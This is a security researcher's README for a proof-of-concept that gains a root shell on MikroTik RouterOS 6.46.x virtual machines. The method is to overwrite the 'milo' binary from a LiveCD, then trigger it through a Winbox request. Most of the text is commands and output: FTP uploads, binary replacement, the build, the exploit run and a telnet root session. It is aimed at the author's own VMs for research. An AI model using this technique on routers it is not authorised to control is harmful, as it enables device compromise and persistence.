# Execute Milo

Since 6.46.1, MikroTik has done a lot of work to remove the various backdooring and persistence techniques that I (and others) have used. Every last one that I presented at Defcon 2019 have been patched up. Ultimately, that's great for MikroTik users. The system is so much more hardened than when I first encountered it two years ago. /bin/sh is even a dead symlink! Truly an impressive turnaround. But...

I still want root so I can continue doing research. As such, I've found a simple way to root virtual machines again. MT will almost certainly patch this in due course, so enjoy it while it lasts.

## Step 0 - An observeration

As discussed elsewhere, when booting via a LiveCD you can easy access to the /flash/ filesystem. MikroTik has left a binary in /flash/bin/ called "milo". We can overwrite this binary and RouterOS doesn't complain on a reboot, so there is no integrity checks on.

Furthermore, milo does get executed. However, it appears only via user request over the Winbox protocol. Sending a "SET" request to sys2 handler 10 with a couple of boolean values will get the milo executed. So... what do?

## Step 1 - Installation
Install RouterOS in a VM using the .iso image.

## Step 2 - Get an IP Address
Enable DHCP or set it statically. I don't care.

```
ip dhcp-client add disable=no interface=ether1
ip dhcp-client print
```

## Step 3 - Drop binaries via FTP
Move to the vm_bins directory (/routeros/poc/execute_milo/vm_bins) and ftp to your VM. Then put milo, busybox, and gdb.

```
albinolobster@ubuntu:~/routeros/poc/execute_milo/vm_bins$ ftp 192.168.88.29
Connected to 192.168.88.29.
220 MikroTik FTP server (MikroTik 6.46.3) ready
Name (192.168.88.29:albinolobster): admin
331 Password required for admin
Password:
230 User admin logged in
Remote system type is UNIX.
ftp> put busybox 
local: busybox remote: busybox
200 PORT command successful
150 Opening ASCII mode data connection for 'busybox'
226 ASCII transfer complete
2139496 bytes sent in 0.12 secs (16.8171 MB/s)
ftp> put milo
local: milo remote: milo
200 PORT command successful
150 Opening ASCII mode data connection for 'milo'
226 ASCII transfer complete
610401 bytes sent in 0.06 secs (9.8214 MB/s)
ftp> put gdb
local: gdb remote: gdb
200 PORT command successful
150 Opening ASCII mode data connection for 'gdb'
226 ASCII transfer complete
5539399 bytes sent in 0.26 secs (19.9693 MB/s)
ftp> quit
221 Closing
```

## Step 4 - Reboot into a LiveCD
Pop a LiveCD into your VM's CD drive. I use CentOS-6.10-i386-LiveDVD.iso. Then use CD/DVD as the startup disk and reboot.

## Step 5 - Make executable and move files
Mount the RouterOS filesystems (technically you only need to mount one). Find the filesystem that contains bin, boot, etc, rw, and var in the top directory. Become root. Do the following:

```
cd rw/disk/
chmod +x busybox
chmod +x gdb
chmod 755 milo
mv milo ../../bin/milo
ln -s /rw/disk/busybox ash
exit
```

reboot into RouterOS

## Step 6 - Build and execute execute_milo
Move up from the vm_bins directory, create a build directory, and invoke cmake and make.

```
albinolobster@ubuntu:~/routeros/poc/execute_milo/vm_bins$ cd ..
albinolobster@ubuntu:~/routeros/poc/execute_milo$ mkdir build
albinolobster@ubuntu:~/routeros/poc/execute_milo$ cd build/
albinolobster@ubuntu:~/routeros/poc/execute_milo/build$ cmake ..
-- The C compiler identification is GNU 8.3.0
-- The CXX compiler identification is GNU 8.3.0
-- Check for working C compiler: /usr/bin/cc
-- Check for working C compiler: /usr/bin/cc -- works
-- Detecting C compiler ABI info
-- Detecting C compiler ABI info - done
-- Detecting C compile features
-- Detecting C compile features - done
-- Check for working CXX compiler: /usr/bin/c++
-- Check for working CXX compiler: /usr/bin/c++ -- works
-- Detecting CXX compiler ABI info
-- Detecting CXX compiler ABI info - done
-- Detecting CXX compile features
-- Detecting CXX compile features - done
-- Boost version: 1.67.0
-- Found the following Boost libraries:
--   program_options
--   system
--   regex
-- Configuring done
-- Generating done
-- Build files have been written to: /home/albinolobster/routeros/poc/execute_milo/build
albinolobster@ubuntu:~/routeros/poc/execute_milo/build$ make
Scanning dependencies of target execute_milo
[ 16%] Building CXX object CMakeFiles/execute_milo.dir/src/main.cpp.o
[ 33%] Building CXX object CMakeFiles/execute_milo.dir/home/albinolobster/routeros/common/md5.cpp.o
[ 50%] Building CXX object CMakeFiles/execute_milo.dir/home/albinolobster/routeros/common/session.cpp.o
[ 66%] Building CXX object CMakeFiles/execute_milo.dir/home/albinolobster/routeros/common/winbox_session.cpp.o
[ 83%] Building CXX object CMakeFiles/execute_milo.dir/home/albinolobster/routeros/common/winbox_message.cpp.o
[100%] Linking CXX executable execute_milo
[100%] Built target execute_milo
albinolobster@ubuntu:~/routeros/poc/execute_milo/build$
```

Execute the compiled binary "execute_milo" - it requires the VM's ip address, the winbox port (8291 by default), the admin username (admin), and the admin password (empty by default). Example:

```
albinolobster@ubuntu:~/routeros/poc/execute_milo/build$ ./execute_milo -i 192.168.88.29 -u admin
[+] Connecting...
[+] Successful login
[+] Successfully executed milo
albinolobster@ubuntu:~/routeros/poc/execute_milo/build$
```

## Step 7 Done
Congrats, you should have a root shell on port 1270.

```
albinolobster@ubuntu:~/routeros/poc/execute_milo/build$ telnet 192.168.88.29 1270
Trying 192.168.88.29...
Connected to 192.168.88.29.
Escape character is '^]'.

/ # uname -a
Linux MikroTik 3.3.5-smp #1 SMP Tue Jan 28 10:51:45 UTC 2020 i686 GNU/Linux
/ # cat /rw/logs/VERSION 
v6.46.3 Jan/28/2020 10:46:05
/ # 
```

## SHASum

albinolobster@ubuntu:~/routeros/poc/execute_milo/vm_bins$ sha1sum busybox 
7d3485b2c75bc03ece720ea91f9cf61146e7b27c  busybox
albinolobster@ubuntu:~/routeros/poc/execute_milo/vm_bins$ sha1sum gdb
1d939b2c8d615e8708159854162e5bd5564b5a68  gdb
albinolobster@ubuntu:~/routeros/poc/execute_milo/vm_bins$ sha1sum milo
8ca32f731662cec4ad384e88e0859d19797143cf  milo

